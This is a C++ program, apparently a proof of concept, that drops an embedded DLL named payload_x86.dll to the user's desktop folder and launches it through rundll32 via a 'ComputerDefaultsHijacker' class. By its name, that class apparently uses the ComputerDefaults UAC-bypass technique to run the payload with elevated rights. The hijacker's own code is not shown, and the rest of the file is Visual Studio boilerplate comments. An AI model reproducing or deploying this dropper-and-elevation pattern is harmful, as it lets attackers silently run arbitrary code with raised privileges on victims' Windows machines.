// Project1.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include "ComputerDefaultsHijacker.h"

#define DLL_PAYLOAD_X86_PATH L"%USERPROFILE%\\Desktop\\Demo_PE\\payload_x86.dll"
#define RUNDLL32_PATH L"%WinDir%\\System32\\rundll32.exe"
#define DLL_PAYLOAD_ENTRY_POINT L"EntryPoint"

int main()
{
	Lib::Init();
	
	LPBYTE pData = NULL;
	DWORD dwDataSize = 0;
	Lib::GetResourceData(IDR_PKW9JSDH1, L"PKw9jsdH", pData, dwDataSize);
	Lib::WriteToFile(DLL_PAYLOAD_X86_PATH, pData, dwDataSize);
	
	WCHAR wzCommand[MAX_PATH] = {0};
	StringCbCatW(wzCommand, sizeof(wzCommand), RUNDLL32_PATH);
	StringCbCatW(wzCommand, sizeof(wzCommand), L" ");
	StringCbCatW(wzCommand, sizeof(wzCommand), DLL_PAYLOAD_X86_PATH);
	StringCbCatW(wzCommand, sizeof(wzCommand), L",");
	StringCbCatW(wzCommand, sizeof(wzCommand), DLL_PAYLOAD_ENTRY_POINT);
	
	ComputerDefaultsHijacker hijacker;
	hijacker.Install(wzCommand);
	hijacker.Run();
	hijacker.Uninstall();
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
